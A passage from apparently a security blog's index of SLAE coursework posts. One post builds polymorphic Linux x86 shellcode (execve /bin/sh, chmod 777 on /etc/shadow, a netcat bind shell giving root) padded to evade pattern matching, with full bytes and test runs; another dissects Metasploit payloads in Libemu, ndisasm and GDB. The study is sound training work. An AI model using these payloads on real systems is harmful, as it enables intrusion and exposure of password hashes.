'[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g'\"\\x9e\\x31\\xc0\\x60\\x50\\xfc\\xbe\\x2e\\x2f\\x73\\x68\\x46\\x99\\xbf\\x2e\\x62\\x69\\x6e\\x47\\x56\\xfd\\x57\\x89\\xe3\\xfc\\xf5\\xb0\\x0b\\xcd\\x80\"root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode##include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char code[] = \\\"\\x9e\\x31\\xc0\\x60\\x50\\xfc\\xbe\\x2e\\x2f\\x73\\x68\\x46\\x99\\xbf\\x2e\\x62\\x69\\x6e\\x47\\x56\\xfd\\x57\\x89\\xe3\\xfc\\xf5\\xb0\\x0b\\xcd\\x80\";main(){ printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret();}EndGame #1root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# gcc polymorphic.c -o polymorphic -fno-stack-protector -z execstack -w root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# ./polymorphic Shellcode Length: 30#Original Size: 23 bytesFinal Size: 30 bytesIncrement: 31%Chmod Shellcode (Shellcode #2)The second shellcode from the three will be one that performs a chmod operation on the file /etc/shadow with privileges 777. It can be found here.Original code:xor eax,eaxpush eaxmov al,0xfpush 0x776f6461push 0x68732f63push 0x74652f2fmov ebx,espxor ecx,ecxmov cx,0x1ffint 0x80inc eaxint 0x80There aren’t many things that we can do. Nonetheless, we can apply similar techniques as we did on the previous shellcode.Final code:; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-590.phpglobal _start_start: dec ebp ; NOP Equivalent. xor eax, eax ; Zeroes out EAX. cdq ; Zeroes out EDX. push edx ; Pushes the dword of EDX (0x00000000). mov al, 0xf ; Moves value of syscall chmod into AL. sahf ; NOP Equivalent. push 0x776f6461 ; woda cld ; NOP Equivalent. push 0x68732f63 ; hs/c push 0x74652f2f ; te// cdq ; NOP Equivalent. mov ebx, esp ; Copies value from ESP to EBX. pushfd ; NOP Equivalent. mov cx, 0x1ff ; Value that means in octal \"0777\". cmc ; NOP Equivalent. int 0x80 ; Call to kernel. inc eax ; Increment EAX to 1, value for syscall exit(). pushad ; NOP Equivalent. int 0x80 ; Call to kernel.Let’s dump the shellcode and test it!root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# nasm -f elf32 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g'\"\\x4d\\x31\\xc0\\x99\\x52\\xb0\\x0f\\x9e\\x68\\x61\\x64\\x6f\\x77\\xfc\\x68\\x63\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x65\\x74\\x99\\x89\\xe3\\x9c\\x66\\xb9\\xff\\x01\\xf5\\xcd\\x80\\x40\\x60\\xcd\\x80\"root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode##include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char code[] = \\\"\\x4d\\x31\\xc0\\x99\\x52\\xb0\\x0f\\x9e\\x68\\x61\\x64\\x6f\\x77\\xfc\\x68\\x63\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x65\\x74\\x99\\x89\\xe3\\x9c\\x66\\xb9\\xff\\x01\\xf5\\xcd\\x80\\x40\\x60\\xcd\\x80\";main(){ printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret();}EndGame #2root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# gcc polymorphic.c -o polymorphic -fno-stack-protector -z execstack -w root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# ls -la /etc/shadow-rw-r--r-- 1 511 12079 1115 Dec 28 10:33 /etc/shadowroot@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# ./polymorphic Shellcode Length: 39root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# ls -la /etc/shadow -rwxrwxrwx 1 511 12079 1115 Dec 28 10:33 /etc/shadowroot@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# Original Size: 33 bytesFinal Size: 39 bytesIncrement: 19%Netcat Shellcode (Shellcode #3)Finally, the third shellcode from the three will be one that performs a bind shell connection in port 13377 through the netcat application. It can be found here.Original code:section .text global _start_start:xor eax,eaxxor edx,edxpush 0x37373333push 0x3170762dmov edx, esppush eaxpush 0x68732f6epush 0x69622f65push 0x76766c2dmov ecx,esppush eaxpush 0x636e2f2fpush 0x2f2f2f2fpush 0x6e69622fmov ebx, esppush eaxpush edxpush ecxpush ebxxor edx,edxmov ecx,espmov al,11int 0x80Similarly to the techniques implemented within the previous shellcode, we will insert NOP equivalents which will difficult pattern matching. Nevertheless, these won’t change execution at all!Final code:; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-804.phpglobal _start_start: sahf ; NOP Equivalent. nop ; NOP Equivalent. cmc ; NOP Equivalent. xor eax,eax ; Zeroes out EAX. mul edx ; Zeroes out EDX through mul. NOP Equivalent. push eax ; NOP Equivalent. pop edx ; NOP Equivalent. push edx ; NOP Equivalent. pop eax ; NOP Equivalent. push 0x37373333 ; 7733 std ; NOP Equivalent. push 0x3170762d ; 1pv- mov edx, esp ; Copies the value of ESP into EDX. push eax ; Pushes EAX null dword (0x00000000) push 0x68732f6e ; hs/n std ; NOP Equivalent. push 0x69622f65 ; ib/e sahf ; NOP Equivalent. push 0x76766c2d ; vvl- mov ecx,esp ; Copies the value of ESP into ECX push eax ; NOP Equivalent. push 0x636e2f2f ; cn// cmc ; NOP Equivalent. push 0x2f2f2f2f ; //// inc edi ; NOP Equivalent. inc esi ; NOP Equivalent. push 0x6e69622f ; nib/ mov ebx, esp ; Copies the value of ESP into EBX. push eax ; Pushes EAX null dword (0x00000000) cld ; NOP Equivalent. push edx ; Pushes value of EDX push ecx ; Pushes value of ECX nop ; NOP Equivalent. push ebx ; Pushes value of EBX cdq ; NOP Equivalent. mov ecx,esp ; Copies value from ESP to ECX push esi ; NOP Equivalent. pop edi ; NOP Equivalent. push edi ; NOP Equivalent. pop esi ; NOP Equivalent. pop ebp ; NOP Equivalent. mov al,11 ; Call to execve(). int 0x80 ; Call to kernel.Let’s dump the shellcode and test it!root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# nasm -f elf32 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g'\"\\x9e\\x90\\xf5\\x31\\xc0\\xf7\\xe2\\x50\\x5a\\x52\\x58\\x68\\x33\\x33\\x37\\x37\\xfd\\x68\\x2d\\x76\\x70\\x31\\x89\\xe2\\x50\\x68\\x6e\\x2f\\x73\\x68\\xfd\\x68\\x65\\x2f\\x62\\x69\\x9e\\x68\\x2d\\x6c\\x76\\x76\\x89\\xe1\\x50\\x68\\x2f\\x2f\\x6e\\x63\\xf5\\x68\\x2f\\x2f\\x2f\\x2f\\x47\\x46\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\xfc\\x52\\x51\\x90\\x53\\x99\\x89\\xe1\\x56\\x5f\\x57\\x5e\\x5d\\xb0\\x0b\\xcd\\x80\"root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode#root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# cat polymorphic.c #include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char code[] = \\\"\\x9e\\x90\\xf5\\x31\\xc0\\xf7\\xe2\\x50\\x5a\\x52\\x58\\x68\\x33\\x33\\x37\\x37\\xfd\\x68\\x2d\\x76\\x70\\x31\\x89\\xe2\\x50\\x68\\x6e\\x2f\\x73\\x68\\xfd\\x68\\x65\\x2f\\x62\\x69\\x9e\\x68\\x2d\\x6c\\x76\\x76\\x89\\xe1\\x50\\x68\\x2f\\x2f\\x6e\\x63\\xf5\\x68\\x2f\\x2f\\x2f\\x2f\\x47\\x46\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\xfc\\x52\\x51\\x90\\x53\\x99\\x89\\xe1\\x56\\x5f\\x57\\x5e\\x5d\\xb0\\x0b\\xcd\\x80\";main(){ printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret();}EndGame #3root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# gcc polymorphic.c -o polymorphic -fno-stack-protector -z execstack -w root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# ./polymorphic Shellcode Length: 83listening on [any] 13377 ...192.168.100.139: inverse host lookup failed: Unknown hostconnect to [192.168.100.200] from (UNKNOWN) [192.168.100.139] 54156─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────root@whitecr0wz:~# rlwrap nc 192.168.100.200 13377 -v 192.168.100.200: inverse host lookup failed: Unknown host(UNKNOWN) [192.168.100.200] 13377 (?) openpython3 -c 'import pty;pty.spawn(\"/bin/bash\")'root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# id id uid=0(root) gid=0(root) groups=0(root)root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode#Original Size: 62 bytesFinal Size: 83 bytesIncrement: 34%CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE - Assignment 5 - Analyzing 3rd party Shellcode", "url": "/posts/SLAE-Analyzing-Shellcode/", "categories": "SLAE", "tags": "assembly, shellcoding", "date": "2021-01-18 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE certification.The fifth assignment from the seven requires analyzing three shellcodes generated by Metasploit through GDB/Ndisasm/Libemu. Furthermore, it is required to report the findings during the analysis.Chmod Shellcode (Shellcode #1)The first shellcode to be analyzed will be one that supposedly chmods a file, however, it isn’t really known which one or the type of privileges that are granted. Let’s find out!Generating the shellcode with msfvenom:root@whitecr0wz:~# msfvenom -p linux/x86/chmod -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 36 bytesFinal size of c file: 177 bytesunsigned char buf[] = \"\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x0c\\x00\\x00\\x00\\x2f\\x65\\x74\\x63\\x2f\"\"\\x73\\x68\\x61\\x64\\x6f\\x77\\x00\\x5b\\x68\\xb6\\x01\\x00\\x00\\x59\\xcd\"\"\\x80\\x6a\\x01\\x58\\xcd\\x80\";root@whitecr0wz:~#LibemuAnalyzing the shellcode with Libemu:whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ echo -ne \"\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x0c\\x00\\x00\\x00\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77\\x00\\x5b\\x68\\xb6\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\" | ../../../libemu/tools/sctest/sctest -vvv -Ss 10000 verbose = 3[emu 0x0x1a155f0 debug ] cpu state eip=0x00417000[emu 0x0x1a155f0 debug ] eax=0x00000000 ecx=0x00000000 edx=0x00000000 ebx=0x00000000[emu 0x0x1a155f0 debug ] esp=0x00416fce ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] cpu state eip=0x00417000[emu 0x0x1a155f0 debug ] eax=0x00000000 ecx=0x00000000 edx=0x00000000 ebx=0x00000000[emu 0x0x1a155f0 debug ] esp=0x00416fce ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] 99 cwd [emu 0x0x1a155f0 debug ] cpu state eip=0x00417001[emu 0x0x1a155f0 debug ] eax=0x00000000 ecx=0x00000000 edx=0x00000000 ebx=0x00000000[emu 0x0x1a155f0 debug ] esp=0x00416fce ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] 6A0F push byte 0xf[emu 0x0x1a155f0 debug ] cpu state eip=0x00417003[emu 0x0x1a155f0 debug ] eax=0x00000000 ecx=0x00000000 edx=0x00000000 ebx=0x00000000[emu 0x0x1a155f0 debug ] esp=0x00416fca ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] 58 pop eax[emu 0x0x1a155f0 debug ] cpu state eip=0x00417004[emu 0x0x1a155f0 debug ] eax=0x0000000f ecx=0x00000000 edx=0x00000000 ebx=0x00000000[emu 0x0x1a155f0 debug ] esp=0x00416fce ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] 52 push edx[emu 0x0x1a155f0 debug ] cpu state eip=0x00417005[emu 0x0x1a155f0 debug ] eax=0x0000000f ecx=0x00000000 edx=0x00000000 ebx=0x00000000[emu 0x0x1a155f0 debug ] esp=0x00416fca ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] E8 call 0x1[emu 0x0x1a155f0 debug ] cpu state eip=0x00417016[emu 0x0x1a155f0 debug ] eax=0x0000000f ecx=0x00000000 edx=0x00000000 ebx=0x00000000[emu 0x0x1a155f0 debug ] esp=0x00416fc6 ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] 5B pop ebx[emu 0x0x1a155f0 debug ] cpu state eip=0x00417017[emu 0x0x1a155f0 debug ] eax=0x0000000f ecx=0x00000000 edx=0x00000000 ebx=0x0041700a[emu 0x0x1a155f0 debug ] esp=0x00416fca ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] 68B6010000 push dword 0x1b6[emu 0x0x1a155f0 debug ] cpu state eip=0x0041701c[emu 0x0x1a155f0 debug ] eax=0x0000000f ecx=0x00000000 edx=0x00000000 ebx=0x0041700a[emu 0x0x1a155f0 debug ] esp=0x00416fc6 ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] 59 pop ecx[emu 0x0x1a155f0 debug ] cpu state eip=0x0041701d[emu 0x0x1a155f0 debug ] eax=0x0000000f ecx=0x000001b6 edx=0x00000000 ebx=0x0041700a[emu 0x0x1a155f0 debug ] esp=0x00416fca ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] CD80 int 0x80sys_chmod(2)[emu 0x0x1a155f0 debug ] cpu state eip=0x0041701f[emu 0x0x1a155f0 debug ] eax=0x00000000 ecx=0x000001b6 edx=0x00000000 ebx=0x0041700a[emu 0x0x1a155f0 debug ] esp=0x00416fca ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] 6A01 push byte 0x1[emu 0x0x1a155f0 debug ] cpu state eip=0x00417021[emu 0x0x1a155f0 debug ] eax=0x00000000 ecx=0x000001b6 edx=0x00000000 ebx=0x0041700a[emu 0x0x1a155f0 debug ] esp=0x00416fc6 ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] 58 pop eax[emu 0x0x1a155f0 debug ] cpu state eip=0x00417022[emu 0x0x1a155f0 debug ] eax=0x00000001 ecx=0x000001b6 edx=0x00000000 ebx=0x0041700a[emu 0x0x1a155f0 debug ] esp=0x00416fca ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] CD80 int 0x80sys_exit(2)[emu 0x0x1a155f0 debug ] cpu state eip=0x00417024[emu 0x0x1a155f0 debug ] eax=0x00000000 ecx=0x000001b6 edx=0x00000000 ebx=0x0041700a[emu 0x0x1a155f0 debug ] esp=0x00416fca ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: [emu 0x0x1a155f0 debug ] 0000 add [eax],alcpu error error accessing 0x00000004 not mappedstepcount 12[emu 0x0x1a155f0 debug ] cpu state eip=0x00417026[emu 0x0x1a155f0 debug ] eax=0x00000000 ecx=0x000001b6 edx=0x00000000 ebx=0x0041700a[emu 0x0x1a155f0 debug ] esp=0x00416fca ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x1a155f0 debug ] Flags: ERROR chmod () = -1;ERROR exit ( int status = 4288522;NdisasmAs seen on the shown text, Libemu reports that the chmod syscall is being initialized! Let’s take a closer look to the code with ndisasm.whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ echo -ne \"\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x0c\\x00\\x00\\x00\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77\\x00\\x5b\\x68\\xb6\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\" | ndisasm -u - 00000000 99 cdq00000001 6A0F push byte +0xf00000003 58 pop eax00000004 52 push edx00000005 E80C000000 call 0x160000000A 2F das0000000B 657463 gs jz 0x710000000E 2F das0000000F 7368 jnc 0x7900000011 61 popa00000012 646F fs outsd00000014 7700 ja 0x1600000016 5B pop ebx00000017 68B6010000 push dword 0x1b60000001C 59 pop ecx0000001D CD80 int 0x800000001F 6A01 push byte +0x100000021 58 pop eax00000022 CD80 int 0x80whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$Really interesting, according to the man page of chmod, ECX should hold the privileges for the file that will be chmodded. As seen, dword “0x1b6” is being pushed into ECX, which in octal means 666! Even more so, we can see EAX performing the syscall in hex, as 0xf in decimal is actually 15, value for the chmod syscall.Regarding the file itself, let’s have a closer look with GDB.GDBWe can easily see the value of the file being altered when the execution is parsed into EAX.Let’s save this into a C file and compile it:whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ gcc dissect_1.c -o dissect_1 -fno-stack-protector -z execstack -w whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ gdb -q ./dissect_1(gdb) break mainBreakpoint 1 at 0x11b8(gdb) runStarting program: /home/whitecr0wz/assembly/assignments/Assignment_5/dissect1/dissect_1 Breakpoint 1, 0x004011b8 in main ()(gdb) disassembleDump of assembler code for function main: 0x004011a9 &lt;+0&gt;: lea ecx,[esp+0x4] 0x004011ad &lt;+4&gt;: and esp,0xfffffff0 0x004011b0 &lt;+7&gt;: push DWORD PTR [ecx-0x4] 0x004011b3 &lt;+10&gt;: push ebp 0x004011b4 &lt;+11&gt;: mov ebp,esp 0x004011b6 &lt;+13&gt;: push ebx 0x004011b7 &lt;+14&gt;: push ecx=&gt; 0x004011b8 &lt;+15&gt;: sub esp,0x10 0x004011bb &lt;+18&gt;: call 0x4010b0 &lt;__x86.get_pc_thunk.bx&gt; 0x004011c0 &lt;+23&gt;: add ebx,0x2e40 0x004011c6 &lt;+29&gt;: sub esp,0xc 0x004011c9 &lt;+32&gt;: lea eax,[ebx+0x40] 0x004011cf &lt;+38&gt;: push eax 0x004011d0 &lt;+39&gt;: call 0x401040 &lt;strlen@plt&gt; 0x004011d5 &lt;+44&gt;: add esp,0x10 0x004011d8 &lt;+47&gt;: sub esp,0x8 0x004011db &lt;+50&gt;: push eax 0x004011dc &lt;+51&gt;: lea eax,[ebx-0x1ff8] 0x004011e2 &lt;+57&gt;: push eax 0x004011e3 &lt;+58&gt;: call 0x401030 &lt;printf@plt&gt; 0x004011e8 &lt;+63&gt;: add esp,0x10 0x004011eb &lt;+66&gt;: lea eax,[ebx+0x40] 0x004011f1 &lt;+72&gt;: mov DWORD PTR [ebp-0xc],eax 0x004011f4 &lt;+75&gt;: mov eax,DWORD PTR [ebp-0xc] 0x004011f7 &lt;+78&gt;: call eax 0x004011f9 &lt;+80&gt;: mov eax,0x0 0x004011fe &lt;+85&gt;: lea esp,[ebp-0x8] 0x00401201 &lt;+88&gt;: pop ecx 0x00401202 &lt;+89&gt;: pop ebx 0x00401203 &lt;+90&gt;: pop ebp 0x00401204 &lt;+91&gt;: lea esp,[ecx-0x4] 0x00401207 &lt;+94&gt;: ret End of assembler dump.(gdb) Let’s put a breakpoint in 0x004011f7, place where the shellcode will finally be executed, loading the values that require the operation in EAX.(gdb) break *0x004011f7Breakpoint 2 at 0x4011f7(gdb) cContinuing.Shellcode Length: 7Breakpoint 2, 0x004011f7 in main ()(gdb)If we read EAX we see something really interesting:(gdb) x/4s $eax 0x404040 &lt;code&gt;: \"\\231j\\017XR\\350\\f\"0x404048 &lt;code+8&gt;: \"\"0x404049 &lt;code+9&gt;: \"\"0x40404a &lt;code+10&gt;: \"/etc/shadow\"(gdb)Conclusion (Shellcode #1)As expected from the start, this shellcode will chmod a certain file. Nonethelss, when not specifing any sort of flag, the file chosen will always be /etc/shadow with the privileges in octal 666.Exec Shellcode (Shellcode #2)The second shellcode to be analyzed will be one that executes a command, in this case being “/bin/id”Generating the shellcode with msfvenom:root@whitecr0wz:~# msfvenom -p linux/x86/exec CMD=/bin/id -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 43 bytesFinal size of c file: 205 bytesunsigned char buf[] = \"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\"\"\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x08\\x00\\x00\\x00\\x2f\"\"\\x62\\x69\\x6e\\x2f\\x69\\x64\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\";root@whitecr0wz:~# LibemuLet’s analyze this shellcode with Libemu:whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect2$ echo -ne \"\\x6A\\x0B\\x58\\x99\\x52\\x66\\x68\\x2D\\x63\\x89\\xE7\\x68\\x2F\\x73\\x68\\x00\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x52\\xE8\\x08\\x00\\x00\\x00\\x2F\\x62\\x69\\x6E\\x2F\\x69\\x64\\x00\\x57\\x53\\x89\\xE1\\xCD\\x80\" | ../../../libemu/tools/sctest/sctest -vv -Ss 10000 verbose = 2[emu 0x0x8205f0 debug ] cpu state eip=0x00417000[emu 0x0x8205f0 debug ] eax=0x00000000 ecx=0x00000000 edx=0x00000000 ebx=0x00000000[emu 0x0x8205f0 debug ] esp=0x00416fce ebp=0x00000000 esi=0x00000000 edi=0x00000000[emu 0x0x8205f0 debug ] Flags: [emu 0x0x8205f0 debug ] 6A0B push byte 0xb[emu 0x0x8205f0 debug ] 58 pop eax[emu 0x0x8205f0 debug ] 99 cwd [emu 0x0x8205f0 debug ] 52 push edx[emu 0x0x8205f0 debug ] 66682D63 push word 0x632d[emu 0x0x8205f0 debug ] 89E7 mov edi,esp[emu 0x0x8205f0 debug ] 682F736800 push dword 0x68732f[emu 0x0x8205f0 debug ] 682F62696E push dword 0x6e69622f[emu 0x0x8205f0 debug ] 89E3 mov ebx,esp[emu 0x0x8205f0 debug ] 52 push edx[emu 0x0x8205f0 debug ] E8 call 0x1[emu 0x0x8205f0 debug ] 57 push edi[emu 0x0x8205f0 debug ] 53 push ebx[emu 0x0x8205f0 debug ] 89E1 mov ecx,esp[emu 0x0x8205f0 debug ] CD80 int 0x80execveint execve (const char *dateiname=00416fc0={/bin/sh}, const char * argv[], const char *envp[]);[emu 0x0x8205f0 debug ] 0000 add [eax],alcpu error error accessing 0x00000004 not mappedstepcount 15[emu 0x0x8205f0 debug ] cpu state eip=0x0041702d[emu 0x0x8205f0 debug ] eax=0x0000000b ecx=0x00416fb0 edx=0x00000000 ebx=0x00416fc0[emu 0x0x8205f0 debug ] esp=0x00416fb0 ebp=0x00000000 esi=0x00000000 edi=0x00416fc8[emu 0x0x8205f0 debug ] Flags: int execve ( const char * dateiname = 0x00416fc0 =&gt; = \"/bin/sh\"; const char * argv[] = [ = 0x00416fb0 =&gt; = 0x00416fc0 =&gt; = \"/bin/sh\"; = 0x00416fb4 =&gt; = 0x00416fc8 =&gt; = \"-c\"; = 0x00416fb8 =&gt; = 0x0041701d =&gt; = \"/bin/id\"; = 0x00000000 =&gt; none; ]; const char * envp[] = 0x00000000 =&gt; none;) = 0;whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect2$Conclusion (Shellcode #2)Interesting, execve is being executed. In addition with this, EBX is being given the value of /bin/sh through the PUSH DWORD instructions, whereas EDI is receiving the value of -c. Even more so, we can comprehend from this output that the following argument /bin/id is being called from a variable through the instruction call 0x1, finally pushing the order in reverse and saving the address in ECX. This just shows the real power of Libemu, capable of dissecting a complete shellcode with no issueswithin a simple output and even filtering those bytes which would mangle the output.read_file Shellcode (Shellcode #3)The second shellcode to be analyzed will be one that opens a file and reads it, in this case the one chosen being “./file”.Generating the shellcode with msfvenom:root@whitecr0wz:~# msfvenom -p linux/x86/read_file PATH=./file -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 68 bytesFinal size of c file: 311 bytesunsigned char buf[] = \"\\xeb\\x36\\xb8\\x05\\x00\\x00\\x00\\x5b\\x31\\xc9\\xcd\\x80\\x89\\xc3\\xb8\"\"\\x03\\x00\\x00\\x00\\x89\\xe7\\x89\\xf9\\xba\\x00\\x10\\x00\\x00\\xcd\\x80\"\"\\x89\\xc2\\xb8\\x04\\x00\\x00\\x00\\xbb\\x01\\x00\\x00\\x00\\xcd\\x80\\xb8\"\"\\x01\\x00\\x00\\x00\\xbb\\x00\\x00\\x00\\x00\\xcd\\x80\\xe8\\xc5\\xff\\xff\"\"\\xff\\x2e\\x2f\\x66\\x69\\x6c\\x65\\x00\";root@whitecr0wz:~#NdisasmLet’s analyze this with Ndisasm:whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect3$ echo -ne \"\\xEB\\x36\\xB8\\x05\\x00\\x00\\x00\\x5B\\x31\\xC9\\xCD\\x80\\x89\\xC3\\xB8\\x03\\x00\\x00\\x00\\x89\\xE7\\x89\\xF9\\xBA\\x00\\x10\\x00\\x00\\xCD\\x80\\x89\\xC2\\xB8\\x04\\x00\\x00\\x00\\xBB\\x01\\x00\\x00\\x00\\xCD\\x80\\xB8\\x01\\x00\\x00\\x00\\xBB\\x00\\x00\\x00\\x00\\xCD\\x80\\xE8\\xC5\\xFF\\xFF\\xFF\\x2E\\x2F\\x66\\x69\\x6C\\x65\" | ndisasm -u - 00000000 EB36 jmp short 0x3800000002 B805000000 mov eax,0x500000007 5B pop ebx00000008 31C9 xor ecx,ecx0000000A CD80 int 0x800000000C 89C3 mov ebx,eax0000000E B803000000 mov eax,0x300000013 89E7 mov edi,esp00000015 89F9 mov ecx,edi00000017 BA00100000 mov edx,0x10000000001C CD80 int 0x800000001E 89C2 mov edx,eax00000020 B804000000 mov eax,0x400000025 BB01000000 mov ebx,0x10000002A CD80 int 0x800000002C B801000000 mov eax,0x100000031 BB00000000 mov ebx,0x000000036 CD80 int 0x8000000038 E8C5FFFFFF call 0x20000003D 2E2F cs das0000003F 66 o1600000040 69 db 0x6900000041 6C insb00000042 65 gswhitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect3$Let’s go section-by-section what is going on:Syscall Openjmp short 0x38mov eax,0x5pop ebxxor ecx,ecxint 0x80Arguments required for open:int open(const char *pathname, int flags);It seems that we have come accross a JMP-CALL-POP technique! The jump will have most likely ended in a section with the file ./file specified. Moreover, EAX was set to 0x5, which is the syscall for open. Furthermore, the value of ./file has been popped into EBX, as it is required to satisfy the argument pathname. Lastly, ECX was set to zero, as the flags aren’t relevant.Syscall Readmov ebx,eaxmov eax,0x3mov edi,espmov ecx,edimov edx,0x1000int 0x80Arguments required for read: ssize_t read(int fd, void *buf, size_t count); The value of EAX has been saved into EBX for further referrals to the file descriptor. EAX is given the value of 3, syscall of read. The address of ESP is copied into EDI and from EDI to ECX, satisfying the argument buf, buffer where to read the file. EDX is set 1000 in order to satisfy the count argument.Syscall Writemov edx,eaxmov eax,0x4mov ebx,0x1int 0x80Arguments required for write:ssize_t write(int fd, const void *buf, size_t count); EDX is given the bytes returned from the Read Syscall from through EAX. EAX is given the value of 4, syscall for write. EBX is given value 1, in order to write to the screen through 